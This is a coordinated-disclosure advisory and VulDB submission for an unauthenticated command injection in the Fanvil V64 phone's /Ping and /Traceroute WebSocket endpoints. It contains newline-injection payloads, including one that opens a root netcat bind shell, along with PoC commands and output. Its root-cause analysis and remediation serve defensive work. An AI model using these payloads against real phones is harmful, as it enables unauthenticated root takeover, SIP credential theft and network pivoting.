# [CVE-TBD] Fanvil V64 2.12.17.7 Unauthenticated OS Command Injection (CWE-78)

## VulDB Submission Fields

- Vendor: Fanvil
- Product: V64
- Version or Commit: 2.12.17.7
- Vulnerability: OS Command Injection (CWE-78)
- Advisory / Exploit URL: https://github.com/Zimo-666/cves/tree/main/fanvil-v64/01-websocket-diagnostic-command-injection
- Description:

```
An OS command injection vulnerability was discovered in Fanvil V64 firmware v2.12.17.7. The embedded "Rapid Logic" HTTP server of the phone exposes the WebSocket diagnostic endpoints /Ping and /Traceroute without any authentication. The text frame payload is treated as the diagnostic target address and is validated by a URL-parser based check (function 0x00389d9c -> uParaUrlParse) that only expects a bare URL authority; a newline character (0x0A) passes this check, and the unchecked string is then formatted with snprintf(buf, 0x30, "traceroute %s ", target) and passed to popen(), i.e. to "/bin/sh -c". The newline therefore terminates the intended traceroute command and everything after it is executed as a shell command. The XGUI process that owns this HTTP server is started as root by /customer/x_app_init.sh during boot, so the injected commands run with root privileges and no credentials are required. Reproduction: open an unauthenticated WebSocket to ws://<phone>/Traceroute and send the text frame "x\nid" - the server returns the output of id through the WebSocket; sending "x\nnc -l -p 4711 -e sh" makes the phone listen on TCP/4711 with a root shell. Any host that can reach the phone's web interface obtains root command execution with a single unauthenticated request; no user interaction or configuration is required. Proposed CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (8.8).
```

---

## Technical Disclosure

# CVE-TBD: Unauthenticated command injection in the Fanvil V64 diagnostic WebSocket endpoints (/Ping and /Traceroute)

## Summary

The Fanvil V64 firmware 2.12.17.7 runs an embedded "Rapid Logic" HTTP server inside the
`/usr/sbin/XGUI` application. The server registers two WebSocket diagnostic endpoints,
`/Ping` and `/Traceroute`, which can be reached without any authentication: the handshake
is answered with `HTTP/1.1 101 Switching Protocols` even when no cookie, credential or
session token is supplied, while all `/cgi-bin/*` handlers of the same server reject
unauthenticated requests with `401` and a Basic challenge.

After the WebSocket is established, the first text frame sent by the client is used as the
destination address of a shell command. The address is checked by a URL parser based helper
(`0x00389d9c`), which only verifies that the value looks like a bare URL authority, and the
value is then embedded into `"ping %s "` or `"traceroute %s "` and executed through
`popen()`. The validator accepts the newline byte (0x0A): a frame such as `x\nid` is
therefore formatted into `traceroute x\nid ` and `/bin/sh -c` executes `id` as a second
command. There is no filtering of the bytes after the newline, so arbitrary shell commands
can be appended.

## Affected Product

- Vendor: Fanvil (Shenzhen Fanvil Technology Co., Ltd.)
- Product: V64 video conferencing phone
- Firmware: **2.12.17.7**, release 2024-03-11 07:50:35
- File: `v64-fanvil-release-ff01-5922-2.12.17.7-krnvUT2024-03-11-07.50.35.z`
  SHA-256 `d2da1c27622e32fc4f6d3bbef17d85b63aafd6de14e4388c4af59531456a20a5`
- Vulnerable component: `/usr/sbin/XGUI` (ARM32 EABI5, stripped, 5,572,196 bytes,
  SHA-256 `8270df91916a8e222e5e8c0b6269542c8c4c880d27bd386854b0dafceced5916`)
- Web interface: TCP/80 (HTTP), the same HTTP server can serve HTTPS when a certificate
  is configured
- The diagnostic handler code is shared with other Fanvil firmware builds that use XGUI
  (the same endpoint and command strings are present in other models), but only
  V64 2.12.17.7 is dynamically verified in this report.

## Vulnerability Details and Root Cause

### 1. Unauthenticated WebSocket endpoint registration

`XGUI` implements the Rapid Logic/1.1 HTTP server (`HTTP/1.1 200 OK` responses carry the
header `Server: Rapid Logic/1.1`). WebSocket handlers are registered for `/echo`, `/log`,
`/Ping` and `/Traceroute` in a static table at `0x005396c0`; each entry holds the URL
path and the two callbacks, and none of the entries carries an authentication callback:

```
005396c0  "/echo"        0x0017680d  0x00000000
005396cc  "/log"         0x00176821  0x00176715
005396d8  "/Ping"        0x00176951  0x00176701   (Thumb pointers)
005396e4  "/Traceroute"  0x00176a25  0x001766ed
```

The diagnostic message callbacks are:

- `/Ping` - `0x00176950` (validation message constant `WEB_APP_INVALID_ADDRESS_MSG`
  at `0x0048caec`)
- `/Traceroute` - `0x00176a24` (same constant)

None of these paths is covered by the HTTP authentication callback used for `/cgi-bin/*`.
A request without any cookie receives:

```
GET /Traceroute HTTP/1.1
Host: <phone>
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <base64>
Sec-WebSocket-Version: 13
```

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: <base64>
```

### 2. Address validation

The message handler calls the helper at `0x00389d9c`, which invokes `uParaUrlParse()` and
only accepts values whose parsed URL has no scheme, path, query or fragment components
(that is, a bare host or IP address). The check rejects characters such as `;`, `|`, `&`,
`$`, backtick, `(`, `)`, `<`, `>`, spaces and `/`, but it does not reject `0x0A`; the
validator operates on the URL structure, not on the character set of the complete string.

### 3. Shell command construction

The validated value is stored and later used by the diagnostic thread:

- `traceroute`: function `0x0009cc38`
  `snprintf(buf, 0x30, "traceroute %s ", target); popen(buf, "r");`
- `ping`: function `0x0009cfa8`
  `snprintf(buf, 0x30, "ping %s ", target); popen(buf, "r");`

`popen()` runs the command through `/bin/sh -c`, so the newline embedded in the frame is
interpreted as a command separator. The trailing space appended by the format string does
not prevent the injected second command from running.

## Vulnerable Component / Function / Call Chain

```
WebSocket text frame
  -> XGUI HTTP server, /Traceroute connection callback      0x00176a24 (0x00176950 for /Ping)
  -> address validation                                    0x00389d9c -> uParaUrlParse()
  -> diagnostic thread                                     0x0009cc38 (traceroute), 0x0009cfa8 (ping)
  -> snprintf(buf, 0x30, "traceroute %s ", target)
  -> popen(buf, "r")                                       /bin/sh -c
  -> arbitrary command execution as the XGUI user
```

`/customer/x_app_init.sh` starts the application with `XGUI &` directly from the root boot
sequence (`/etc/init.d/rcS` -> `sigmastar_init.sh` -> `/customer/fv_0_boot.sh` ->
`/customer/x_app_init.sh`); no `setuid`/`su` is used, therefore the HTTP server and all
commands started by it run as root on the device.

## Authentication Requirements and Attack Conditions

- Authentication: none. The WebSocket upgrade succeeds without a cookie or Authorization
  header (verified). HTTP Basic credentials are only enforced for `/cgi-bin/*`.
- Network position: any host that can reach TCP/80 of the phone (LAN, or the Internet if
  the web interface is exposed/NAT-forwarded).
- User interaction: none.
- Configuration: none; the diagnostic endpoints are always registered.

## Proof of Concept and Reproduction

The PoC is `poc.py` in this directory. It performs the WebSocket handshake (no cookies),
sends one text frame and prints the response; with `--bind-port` it also starts a shell
and runs `id`.

```
# command execution, output is returned in the WebSocket stream
python3 poc.py --host <host> --path /Traceroute --cmd "id; uname -a"

# interactive root shell on TCP/4711
python3 poc.py --host <host> --bind-port 4711
```

The same result is obtained with `/Ping`.

## Observed Results and Evidence

The firmware was executed in an isolated QEMU ARM user-mode chroot (rootfs + `/config` +
`/customer` from the tested firmware, network namespace, unprivileged UID). The
unauthenticated WebSocket upgrade returned `101 Switching Protocols`; the frame
`x\nid; uname -a; echo PWNED_MARKER` was executed and `id` output was returned through the
same WebSocket:

```
[+] WebSocket upgraded on 127.0.0.1:80/Traceroute (no authentication)
[+] Sent frame: 'x\nid; uname -a; echo PWNED_MARKER'
[+] Server output: b'uid=1000 gid=1000 groups=0(root),1000\n...'
```

The frame `x\nnc -l -p 4711 -e sh` started a shell on TCP/4711:

```
[+] WebSocket upgraded on 127.0.0.1:80/Traceroute (no authentication)
[+] Sent frame: 'x\nnc -l -p 4711 -e sh'
[+] Shell output:
uid=1000 gid=1000 groups=0(root),1000
Linux ... armv7l GNU/Linux
```

The server was listening on TCP/4711 after the frame was processed (`ss -ltn`), and the
commands returned by the shell were produced by the emulated firmware. In the isolated
test the XGUI process was started with a non-root UID; on the real device the boot script
starts it as root.

## Security Impact

An unauthenticated attacker with network access to the web interface can execute arbitrary
commands with the privileges of the root-owned XGUI process. This allows full compromise of
the phone: reading/writing configuration and credential stores, extracting SIP accounts,
installing persistence, pivoting into the VoIP network, and disabling the device. No
credentials or user interaction are required.

## CWE and CVSS Vector

- CWE-78: Improper Neutralization of Special Elements used in an OS Command
- CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (8.8)
- If the web interface is reachable from the Internet, AV:N applies (9.8).

## Related CVEs / Novelty Analysis

- CVE-2025-70518 / CVE-2025-70521 (Fanvil X7A 2.6.0.1182 and PA2S 2.12.44.9) describe a
  WebSocket command injection in the management portal diagnostic ping tool of those
  products. The V64 is not listed in those records; this report covers a different
  product, a different firmware generation (Linux/SigmaStar ARM32 XGUI) and a different
  bypass (newline accepted by the URL-authority validator, versus the semicolon used in
  the published X7A/PA2S PoC). Following common CNA practice, a separate CVE is
  requested for the V64 affected product.
- CVE-2025-70516 / CVE-2025-70520 describe missing authentication on the same WebSocket
  interface of the X7A/PA2S; the missing authentication is a precondition of this finding
  on the V64, but the command injection is an independent defect (input validation and
  shell execution) and is reported as such.
- No public report, advisory or CVE for Fanvil V64 command injection was found during the
  searches performed for this disclosure.

## Suggested Remediation

- Require the same authentication/authorization for the WebSocket diagnostic endpoints
  (/Ping, /Traceroute, /echo, /log) as for `/cgi-bin/*`.
- Replace `popen("traceroute %s ")` with `fork()`/`execve()` and pass the address as a
  single argv element; never build shell command lines from request data.
- Strictly validate the address as an IPv4/IPv6 literal or a hostname (allowed character
  set and maximum length) and reject all control characters, including CR/LF.
- Drop privileges for the web server and diagnostic helpers.

## Disclosure Status

- Reported to the vendor through the coordinated disclosure process; CVE ID requested
  (CVE-TBD).
- This document is not public yet; the advisory URL is a placeholder until publication.
